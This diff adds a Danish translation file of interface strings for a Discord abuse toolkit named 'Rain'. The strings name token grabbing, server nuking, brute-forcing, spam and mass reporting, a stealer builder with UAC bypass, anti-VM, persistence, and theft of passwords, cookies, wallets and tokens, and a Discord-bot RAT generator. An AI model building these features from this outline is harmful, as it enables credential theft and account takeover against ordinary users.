@@ -1,0 +1,396 @@
+Token Info{end_space15}
+Token Login{end_space15}
+Token Nuker{end_space14}
+Token Grabber{end_space12}
+Token Disabler{end_space11}
+Token Brute-Force{end_space8}
+Fake Typer{end_space15}
+Vanity Sniper{end_space12}
+GroupChat Spammer{end_space8}
+Friends Blocker{end_space10}
+Friends Remover{end_space15}
+Friends Request Remover{end_space2}
+Opret nye servere{end_space8}
+Profilændring{end_space12}
+QR-kodegreb{end_space14}
+Discord Rot Bot{end_space10}
+Knaptrykker{end_space14}
+Beskedreaktor{end_space12}
+Mass DM{end_space18}
+Masserapport{end_space13}
+Mass Friend{end_space14}
+DM-sletning{end_space14}
+DM-sletter{end_space15}
+Omgå regler{end_space14}
+Bypass RestoreCord{end_space7}
+Bypass Sledge Hammer{end_space5}
+Webhook-værktøj{end_space10}
+Lavet af Plingenn{end_space8}
+Ændringslog{end_space16}
+Indstillinger{end_space14}
+{space}Chat
+Administrer tokens
+Næste side{end_space1}
+Kører på:{end_space15}
+Ugyldigt valg, prøv venligst igen!
+Afbrudt af brugeren.
+Temaskifter
+Kontoindstillinger
+Proxyindstillinger
+Udseendeindstillinger
+Skift debugtilstand
+Adminpanel
+Ugyldig indstilling
+CYAN
+BLÅ
+GRØN
+RØD
+HVID
+GUL
+MAGENTA
+LYSERØD
+LYSEBLÅ
+LYSEGRØN
+LYSECYAN
+LYSE SORT
+Tema indstillet til
+Kontooversigt
+Min licens
+Købshistorik
+Indløs kode
+Download software
+Brugernavn
+Oprettet den
+Skift brugernavn
+Log ud
+Brugernavnsændring mislykkedes, Brugernavnet skal indeholde mindst 3 tegn.
+Vil du logge ud fra din konto? (Y/N)
+Produkt
+Udløber om
+Dato
+Indtast din produktkode for at få dit indhold.
+Kode
+Du har allerede indløst koden.
+Sørg for at gemme dit produkt, inden du trykker Enter!
+Nøgle ikke fundet i svaret
+Kunne ikke hente data for den angivne kode
+URL ikke fundet i kodeinformationen
+Ugyldig kode!
+Skift Proxy-brug
+Ryd Proxy-cache
+Tilføj egne Proxies til Cache
+Skrammel Proxy
+Ugyldigt valg
+Debug-tilstand skiftet {RED}OFF
+Debug-tilstand skiftet {GREEN}ON
+Ny godkendelsessystem tilføjet
+Forbedret konfigurationssystem
+Omstruktureret panelgrænseflade
+Tilføjet chat-system
+Tilføjet nye kontoindstillinger
+Implementeret caching for bedre ydeevne
+Brugerdefineret Discord RPC
+Skift Discord RPC
+Skift brugerdefineret Discord RPC
+Rediger brugerdefineret Discord RPC
+Brugerdefineret Discord RPC slået fra
+Brugerdefineret Discord RPC slået til
+Detaljer (Påkrævet)
+Detaljer skal være mindst 3 tegn lange.
+Tilstand (Påkrævet)
+Tilstand skal være mindst 3 tegn lang.
+Stort billede-URL (Valgfri)
+Stor tekst (Valgfri)
+Lille billede-URL (Valgfri)
+Lille tekst (Valgfri)
+Hvor mange knapper vil du have?
+Indtast etiket til knap
+Indtast URL til knap
+Ugyldig URL-format. Indtast venligst en gyldig URL.
+Ugyldigt antal knapper. Indtast venligst et nummer mellem 0 og 2.
+Discord RPC slået fra
+Discord RPC slået til
+Normal tilstand
+RestoreCord-tilstand (omgå captcha)
+Cache Checker
+Brugerdefineret Checker
+Server Checker
+Indtast den brugerdefinerede sti for at indlæse tokens fra
+Normal chat
+Support chat (utilgængelig)
+Privat chat (utilgængelig)
+Server-søgning{end_space11}
+Serverkloner{end_space13}
+Server Nuker{end_space13}
+Token Joiner{end_space13}
+Token Leaver{end_space13}
+Token Spammer{end_space12}
+Anfald{end_space19}
+SoundBoard Spammer{end_space7}
+Voice Chat-tilslutning{end_space3}
+Profilbillede-ændring{end_space8}
+Global Nick-ændring{end_space6}
+Server Nick-ændring{end_space9}
+HypeSquad-ændring{end_space8}
+Pronouns-ændring{end_space9}
+Sprogændring{end_space13}
+Statusændring{end_space12}
+Temaskifter{end_space14}
+Biografændring{end_space11}
+Konto Generator{end_space10}
+VideoCrash Maker{end_space9}
+Indstillinger Cykler{end_space9}
+Patch noter{end_space14}
+Telegram{end_space17}
+Selfbot{end_space18}
+Github{end_space19}
+Om{end_space23}
+Afslut{end_space19}
+Forrige side{end_space3}
+Servernavne
+Besked
+Trådantal
+Der opstod en fejl:
+Ingen tokens blev fundet i cache
+Udrulning af Rain Nuke
+Rain Nuke udrullet. . .
+Beskeder
+Besked-ID:
+Sendt en besked til alle tilgængelige venner.
+Forlod guild:
+Slettede guild:
+Den følgende fejl er stødt på og ignoreres:
+Slettede/Forlod alle tilgængelige guilds.
+Fjerner ven:
+Fjernet ven:
+Fjernede alle tilgængelige venner.
+Oprettelse
+Oprettet
+Oprettede alle servere.
+Rain Nuke Detonated med succes!
+Succesfuldt omdannet til et Reme ødemark
+Indtast noget for at fortsætte. . .
+Start af anfaldstilstand (Tænd/sluk Lys/mørk tilstand)
+Ikke nok venner til at fortsætte.
+Der opstod en fejl under behandling af token
+Kanal spammer
+Kanal ID
+Regler Bypass
+Guild ID
+Token Fake Typer
+Global Nicker
+Nick Navn
+Server Nicker
+Pronouns-ændring
+Tilfældige Pronouns (y/n)
+Pronouns
+Slettede DM:
+Ikke nok DMs til at fortsætte.
+Cyklus afbrudt
+Sound Board Spammer
+Program afbrudt af brugeren.
+Kunne ikke sende hjerteslag med token:
+Kunne ikke deltage i VC med token:
+Deltagelse i VC med Tokens..
+Opdateret invitationen med succes, din server kan nu tilgås af
+Kunne ikke opdatere pralende url. Statuskode:
+Pralende kode at snipe
+Server ID til at anvende pralende til
+Forsinkelse mellem kontroller (sekunder)
+Vanity Sniper er startet. Tryk på Ctrl+C for at stoppe.
+Fejl:
+Webhook Spammer
+Webhook Deleter
+Webhook
+Webhook blev slettet med succes
+Token Manager
+Gem Tokens
+Ryd Tokens
+Kontroller Tokens og gem kun gyldige (y/n)
+Tokens Cache Tømt.
+Indtast stien til tekstfilen indeholdende tokens
+Ingen tokens blev fundet i den angivne tekstfil
+Token Checker
+Kunne ikke få servernavn:
+Deltagelse
+Rain token brute-force. PS: Dette kan tage lang tid at arbejde.
+Hvis du er ekstremt heldig og i stand til at få nogen tokens, opdager du det gemt inden for 'brute-force.txt'.
+Søg altid om udtrykkeligt tilladelse fra personen, før du udfører et brute force-angreb på deres konto.
+Ugyldig bruger-id, prøv venligst igen!
+Gyldig
+Ugyldig
+Fejl ved hentning af faktureringskilder:
+Fejl ved hentning af nitro-data:
+Ingen faktureringsoplysninger tilgængelige.
+Indsamling af brugerinfo & webdrivere..
+Filnavn
+Fil adgangskode
+Ønsker du at angive en ikonfil? (Y/N)
+Ugyldig ikonsti eller URL. Indstilling ikon til Ingen.
+Ping mig (Y/N)
+Anti VM (Y/N)
+Sæt ved opstart (Y/N)
+UacBypass (Y/N)
+Smelte (Y/N)
+Skjul konsol (Y/N)
+FangWebkamera (Y/N)
+FangAdgangskoder (Y/N)
+FangCookies (Y/N)
+FangAutofills (Y/N)
+FangHistorie (Y/N)
+FangDiscordTokens (Y/N)
+FangSpil (Y/N)
+FangWifiAdgangskoder (Y/N)
+FangSystemInfo (Y/N)
+FangScreenshot (Y/N)
+FangTelegram (Y/N)
+FangFællesFiler (Y/N)
+FangPunge (Y/N)
+FakeError (Y/N)
+FakeErrorTitel
+FakeErrorMessage
+BlokerAvSites (Y/N)
+DiscordInjection (Y/N)
+Filikon
+Oprettelse af {name}.exe, Dette vil tage et par sekunder. Tak for din tålmodighed!
+Fil er i 'output/grabberbuilder/{name}.exe
+Oprettet groupchat
+Begrænset ({response.json()['retry_after']}ms)
+Ikke nok venner tilfældigt valg
+Ønsker du selv at vælge brugere til groupchat spam, eller vil du vælge tilfældige?
+Vælg brugere selv
+Tilfældiggør brugerne
+Oprettelse af groupchats
+Bruger-id'er
+Du havde ikke nogen kommaer (,) format er id,id2,id3
+på ethvert tidspunkt at stoppe
+Blokeret:
+Fejl ved hentning af forhold:
+Ikke nok venneanmodninger til at fortsætte.
+Indkommende venneanmodning Fra:
+Fjernet venneanmodning Fra:
+Total venneanmodninger fjernet:
+Der opstod en fejl under oprettelsen af {server_name}: {e}
+ikon til serverne ja/nej
+Tilfældige servernavne
+Brugerdefinerede servernavne
+Navnene på de servere, der vil blive oprettet
+Angiv venligst ikonplaceringen
+Kunne ikke finde "{image}" på din pc
+Brugerdefineret status
+Brugerdefineret biografi
+Oprettelse af fil... {i}
+Skrivning af fil... {i}
+Bemærk: Denne kode fungerer ikke helt i øjeblikket, men den er stadig kørende.\nDog kan du støde på fejl eller fejl.
+Indtast navnet, du vil give til den endelige fil
+Indtast botens token, du vil bruge til at udføre RAT-kommandoer
+Bot-token
+Indtast guild ID, hvor de skråstregskommandoer er registreret
+Fejl ved skrivning af fil: {e}
+Fil er korrekt skrevet til "output/{fileName}.py"
+Konverter din script til en eksekverbar (Y/N)
+Filoprettelse...
+Rydning af gamle filer...
+Den eksekverbare fil er korrekt genereret
+Der opstod en HTTP-fejl: {e}
+Besked-id
+Vælg venligst den knap, du vil trykke på
+{r}({LIGHTBLACK_EX}{i}{r}) Navn: {LIGHTBLACK_EX}{button_label}{r} , Brugerdefineret ID: {LIGHTBLACK_EX}{button_custom_id}
+Knap
+Kun en knap fundet i beskeden.
+Fejl ved tilføjelse af reaktion {reaction} til besked {message_id}. Maksimalt antal reaktioner nået.
+Maksimalt antal reaktioner nået.
+Fejl ved tilføjelse af reaktion {reaction} til besked {message_id}. Forbudt: {error_message}
+Objekter
+Ansigter
+Dyr
+Symboler
+Ingen emojis fundet i svaret
+Kunne ikke hente emojis fra API'et
+Invitationslink
+Ugyldigt invitationslinkformat.
+Der opstod en fejl under afsendelse af anmodningen
+Invitationsoplysninger:
+Inviteringsoplysninger:
+Serveroplysninger:
+Kanal
+Udløbsdato
+Bruger-id
+Badges
+Utilgængelig
+Navn
+Server-ID
+Beskrivelse
+Banner
+Banner-URL
+Banner-URL (utilgængelig)
+Pralende URL
+Verifikationsniveau
+Splash
+Splash URL
+Splash URL (utilgængelig)
+Funktioner
+Anfald startede. Tryk på Ctrl+C for at stoppe.
+Anfald afbrudt
+Sprogcykling er startet. Tryk på Ctrl+C for at stoppe.
+Ugyldig Token.
+Tryk på ENTER for at fortsætte
+Discord API-værktøj | https://Rain.xyz | Lavet af Plingenn
+Udseendeindstillinger
+Tekstindstillinger
+Cursorindstillinger
+Gennemsigtighedsindstillinger
+Vinduesindstillinger
+Sprogindstillinger
+Farveskema
+Skrifttype
+Skriftstørrelse
+Linjehøjde
+Skriftvægt
+Retro Terminal Effekter
+Farveindstillinger
+Skriftindstillinger
+Skriftstørrelsesindstillinger
+Linjehøjdeindstillinger
+Skriftvægtindstillinger
+Retro indstillinger
+Cursorindstillinger
+Sprog indstillet til {chosen_language}
+Uden navn
+Type
+Hus
+Beskedlink
+Ugyldig beskedlink
+Går tilbage...
+Kunne ikke oprette forbindelse til Discord RPC: {e}
+Valg
+Tema
+Indstilling
+Rediger
+Sprog
+Panelgennemsigtighed
+Ugyldig gennemsigtighed
+Vinduesindstillinger
+Denne mulighed er under udvikling
+Denne mulighed er i øjeblikket utilgængelig. Vær tålmodig, da den vil blive tilføjet senere.
+Denne mulighed er i øjeblikket utilgængelig.
+Det vil blive erstattet i en af de kommende opdateringer med: '{replacement}'.
+Denne mulighed er ikke tilgængelig
+Disse indstillinger er i øjeblikket under udvikling
+Disse indstillinger er i øjeblikket under udvikling, men forbliver brugbare. Det er dog sandsynligt, at der kan opstå fejl eller fejl.
+Kunne ikke hente pronomen fra {pronounce_url} ({statuscode})
+Proxy-brug er i øjeblikket utilgængelig. Vi beklager ulejligheden. Det vil være tilgængeligt i en af vores kommende opdateringer.
+Proxy-brug Toggled {RED}OFF
+Proxy-brug Toggled {GREEN}ON
+Proxies blev skrevet korrekt
+Proxies blev skrabet korrekt
+Færdig! Skrabet {proxies} i alt => {temp} | {execution_time} ms
+PC
+Implementeret flersproget support.
+Massetråd{end_space16}
+Forumspammer
+Masse DM til brugere{end_space5}
+N/A (ikke relevant){end_space6}
+Serverboost{end_space19}
+Token online bruger{end_space6}
+Spørgeskemaskaber{end_space8}
